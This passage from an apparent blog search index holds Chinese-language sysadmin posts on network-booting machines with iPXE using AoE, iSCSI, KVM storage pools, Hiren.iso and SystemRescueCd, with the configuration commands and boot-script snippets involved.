class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/storage/storage1.img \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e1024k \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e20000\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e做一块aoe硬盘：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evbladed \u003cspan class=\"m\"\u003e65535\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e eth0 /storage/storage1.img  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下 vbladed 后面跟了2个数字，第一个是主序列号，可以从 0-65535，第二个是次序列号，可以从0-255。然后跟发布的网卡，最后是存储空间。\u003c/p\u003e\n\u003cp\u003e最好把vbladed放入/etc/rc.d/rc.local\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/rc.local  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evbladed \u003cspan class=\"m\"\u003e65535\u003c/span\u003e \u003cspan class=\"m\"\u003e255\u003c/span\u003e eth0 /storage/storage1.img  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，服务器端的工作就完成了，大家看到了，基本什么也没设，因为是走在二层么。\u003c/p\u003e\n\u003cp\u003e然后ipxe部分就简单了，依样画葫芦修改boot2.php：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:d9:fe:43\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;set keep-san 1\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanboot aoe:e65535.255\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e搞定\u003c/p\u003e","title":"ipxe与aoe启动"},{"content":"按上一篇所说，我们已经弄了个iscsi上面的win7卷，其实就是把萝卜花园的win7 clone到了一个10G的文件卷上。\n引申问题： 大家其实可以用qcow2的文件格式保存的：\nqemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G vi /etc/tgt/targets.conf \u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; backing-store /export/iscsi/disk03.img backing-store /export/iscsi/windows7.qcow2 write-cache off \u0026lt;/target\u0026gt; tgt-admin --execute 那么，我们如何让ipxe直接起动这个iscsi卷呢？ 还是编辑boot2.php即可：\ncase \u0026#39;\\52:54:00:d9:fe:43\u0026#39;: echo \u0026#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\\n\u0026#34;; break; 注意啊，查遍很多网上资料： sanboot的参数都是iscsi:ip::::iqn，实际无论是实体机的pxe，还是kvm虚拟机的pxe，都无法启动。以下格式才是正确的： iscsi:ip::3260:1:iqn\n这样装个win7就简单了，拷贝一下disk03.img这个模板，启动pxe即可\n#!/bin/bash virt-install \\ --name=pxe-16-11-8 \\ --vcpu=2 \\ --ram=4096 \\ --nodisks \\ --boot network \\ --os-type=windows \\ --os-variant=win7 \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5910 以后就可以用这个办法瞬间弄出一堆win虚机了，用完就删除\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_iscsi/","summary":"\u003cp\u003e按上一篇所说，我们已经弄了个iscsi上面的win7卷，其实就是把萝卜花园的win7 clone到了一个10G的文件卷上。\u003c/p\u003e\n\u003cp\u003e引申问题： 大家其实可以用qcow2的文件格式保存的：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eqemu-img create -f qcow2 /export/iscsi/windows7.qcow2 60G  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tgt/targets.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/disk03.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/windows7.qcow2\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    write-cache off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/target\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etgt-admin --execute  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那么，我们如何让ipxe直接起动这个iscsi卷呢？ 还是编辑boot2.php即可：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:d9:fe:43\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sanboot iscsi:172.16.8.6::3260:1:iqn.2016-07.iscsi:disk03\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意啊，查遍很多网上资料： sanboot的参数都是iscsi:ip::::iqn，实际无论是实体机的pxe，还是kvm虚拟机的pxe，都无法启动。以下格式才是正确的：\n\u003cstrong\u003eiscsi:ip::3260:1:iqn\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e这样装个win7就简单了，拷贝一下disk03.img这个模板，启动pxe即可\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003epxe-16-11-8 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--nodisks \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--boot network \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003ewindows  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant\u003cspan class=\"o\"\u003e=\u003c/span\u003ewin7 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5910\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e以后就可以用这个办法瞬间弄出一堆win虚机了，用完就删除\u003c/p\u003e","title":"ipxe远程启动iscsi上面的克隆卷"},{"content":"最近都在研究ipxe和iscsi，那么如何让kvm使用存储在iscsi上面的文件卷呢？\n假设我们已经按之前的文章架好了iscsi：\n造个10G文件:\ndd if=/dev/zero of=/export/iscsi/disk03.img count=0 bs=1 seek=10G 服务端增加iscsi target\nvi /etc/tgt/targets.conf \u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt; backing-store /export/iscsi/disk03.img write-cache off \u0026lt;/target\u0026gt; tgt-admin --execute isci准备好了，然后我们去kvm定义池子：myiscsi\nvirsh virsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path virsh# pool-start myiscsi Name State Autostart ----------------------------------------- myiscsi active no virsh# pool-autostart myiscsi virsh # pool-list Name State Autostart ----------------------------------------- myiscsi active yes virsh# vol-list myiscsi Name Path ----------------------------------------- unit:0:0:1 /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1 ok，记下来这个Name：unit:0:0:1\n然后我们来安装win的kvm吧，直接clone输出到硬盘\nvirt-install \\ --name=iscsi-16-11-9 \\ --vcpu=2 \\ --ram=4096 \\ --cdrom=/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso \\ --boot network,cdrom,hd,menu=on \\ --disk vol=myiscsi/unit:0:0:1 \\ --os-type=windows \\ --os-variant=win7 \\ --network bridge=br0 \\ --vnc --vnclisten=0.0.0.0 --vncport=5911 注意上面disk的参数，myiscsi/unit:0:0:1\n启动后就直接开始安装了，选运行Ghost11:\n然后把win7.gho给clone到10G的盘上：\n重启后请停掉虚机，然后把这个clone好的分区文件disk03.img保存一份，下次就可以直接复制到池子里供新建的虚机用了，哈哈。\n","permalink":"https://rendoumi.com/posts/20240118-kvm_iscsi/","summary":"\u003cp\u003e最近都在研究ipxe和iscsi，那么如何让kvm使用存储在iscsi上面的文件卷呢？\u003c/p\u003e\n\u003cp\u003e假设我们已经按之前的文章架好了iscsi：\u003c/p\u003e\n\u003cp\u003e造个10G文件:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edd \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/dev/zero \u003cspan class=\"nv\"\u003eof\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/iscsi/disk03.img \u003cspan class=\"nv\"\u003ecount\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"nv\"\u003ebs\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eseek\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e10G  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e服务端增加iscsi target\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/tgt/targets.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;target iqn.2016-07.com.renhe:renhe-16-8-6.disk03\u0026gt;  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    backing-store /export/iscsi/disk03.img\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    write-cache off\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u0026lt;/target\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etgt-admin --execute  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eisci准备好了，然后我们去kvm定义池子：\u003cstrong\u003emyiscsi\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-define-as myiscsi 172.16.8.6 - iqn.2016-07.com.renhe:renhe-16-8-6.disk03 - /dev/disk/by-path\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-start myiscsi  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyiscsi              active     no     \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# pool-autostart myiscsi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh \u003cspan class=\"c1\"\u003e# pool-list  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 State      Autostart  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emyiscsi              active     yes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirsh# vol-list myiscsi  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eName                 Path  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-----------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunit:0:0:1           /dev/disk/by-path/ip-172.16.8.6:3260-iscsi-iqn.2016-07.com.renhe:renhe-16-8-6.disk03-lun-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eok，记下来这个Name：\u003cstrong\u003eunit:0:0:1\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e然后我们来安装win的kvm吧，直接clone输出到硬盘\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evirt-install \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e--name\u003cspan class=\"o\"\u003e=\u003c/span\u003eiscsi-16-11-9 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vcpu\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--ram\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4096\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--cdrom\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/kvm/iso/Luobo_Ghost_Win7_SP1_x86_2015_0904.iso \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--boot network,cdrom,hd,menu\u003cspan class=\"o\"\u003e=\u003c/span\u003eon \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--disk \u003cspan class=\"nv\"\u003evol\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003emyiscsi/unit:0:0:1 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-type\u003cspan class=\"o\"\u003e=\u003c/span\u003ewindows  \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--os-variant\u003cspan class=\"o\"\u003e=\u003c/span\u003ewin7 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--network \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebr0 \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e--vnc --vnclisten\u003cspan class=\"o\"\u003e=\u003c/span\u003e0.0.0.0 --vncport\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e5911\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面disk的参数，\u003cstrong\u003emyiscsi/unit:0:0:1\u003c/strong\u003e\u003c/p\u003e","title":"kvm使用iscsi作为存储池安装win"},{"content":"我们希望有紧急情况出现的时候，ipxe可以用systemrecuecd救急，可能也希望机器上架前测测内存、分区、起个winpe等等。这时候就要用到hiren这个工具了，这个东西就是国外的老毛桃工具箱！\n很简单，修改boot2.php\ncase \u0026#39;\\52:54:00:a7:ef:5d\u0026#39;: echo \u0026#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\\n\u0026#34;; echo \u0026#34;chain http://172.16.8.1/ks/winpe/memdisk iso raw\\n\u0026#34;; break; memdisk从syslinux里面拷贝即可。\n这样就有一个万用工具可用了,iso启动都可以采用这种方式哦。\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_hiren/","summary":"\u003cp\u003e我们希望有紧急情况出现的时候，ipxe可以用\u003ccode\u003esystemrecuecd\u003c/code\u003e救急，可能也希望机器上架前测测内存、分区、起个winpe等等。这时候就要用到\u003ccode\u003ehiren\u003c/code\u003e这个工具了，这个东西就是国外的老毛桃工具箱！\u003c/p\u003e\n\u003cp\u003e很简单，修改boot2.php\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ecase\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\\52:54:00:a7:ef:5d\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;initrd http://172.16.8.1/ks/winpe/Hiren.iso\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;chain  http://172.16.8.1/ks/winpe/memdisk iso raw\\n\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    break\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003ememdisk从syslinux里面拷贝即可。\u003c/p\u003e\n\u003cp\u003e这样就有一个万用工具可用了,iso启动都可以采用这种方式哦。\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240118141641267\" loading=\"lazy\" src=\"/posts/20240118-ipxe_hiren/image-20240118141641267.png\"\u003e\u003c/p\u003e","title":"IPXE万能工具hiren.iso的启动方式"},{"content":"既然用到ipxe，就试试远程运行systemrecuecd。万一系统出毛病，可以用来恢复或者急救。\n下载cd\nwget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso 装进 http://172.168.8.1/ks/sysrcd目录中\nmount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso mkdir -p /var/www/html/ks/sysrcd cp -r /mnt/iso/* /var/www/html/ks/sysrcd 重头戏，依然按前面的方法修改boot2.php即可\ncase \u0026#39;\\ec:f4:bb:d9:96:40\u0026#39;: $ip=\u0026#34;172.16.36.2:172.16.37.254:255.255.254.0:myhost-16-36-2\u0026#34;; $ipa=explode(\u0026#39;:\u0026#39;,$ip); echo \u0026#34;ifopen net0\\n\u0026#34;; echo \u0026#34;set net0/ip $ipa[0]\\n\u0026#34;; echo \u0026#34;set net0/netmask $ipa[2]\\n\u0026#34;; echo \u0026#34;set net0/gateway $ipa[1]\\n\u0026#34;; echo \u0026#34;set net0/dns $dns\\n\u0026#34;; echo \u0026#34;set base-url http://172.16.8.1/ks/sysrcd\\n\u0026#34;; echo \u0026#34;kernel \\${base-url}/isolinux/rescue32 netboot=\\${base-url}/sysrcd.dat nodhcp eth0=172.16.36.2/23 dns=172.16.8.1 gateway=172.16.37.254 rootpass=xxxxxxxx vncserver=1:password nameif=eth0:ec:f4:bb:d9:96:40\\n\u0026#34;; echo \u0026#34;initrd ${base-url}/isolinux/initram.igz\\n\u0026#34;; echo \u0026#34;boot\\n\u0026#34;; break; 注意上面，静态ip的设置部分，还有同时设置了sshd和vncserver，方便远程操作。\n","permalink":"https://rendoumi.com/posts/20240118-ipxe_sysrecuecd/","summary":"\u003cp\u003e既然用到ipxe，就试试远程运行\u003ccode\u003esystemrecuecd\u003c/code\u003e。万一系统出毛病，可以用来恢复或者急救。\u003c/p\u003e\n\u003cp\u003e下载cd\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://downloads.sourceforge.net/project/systemrescuecd/sysresccd-x86/4.7.3/systemrescuecd-x86-4.7.3.iso  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e装进 http://172.168.8.1/ks/sysrcd目录中\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -o loop systemrescuecd-x86-4.7.3.iso /mnt/iso  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p 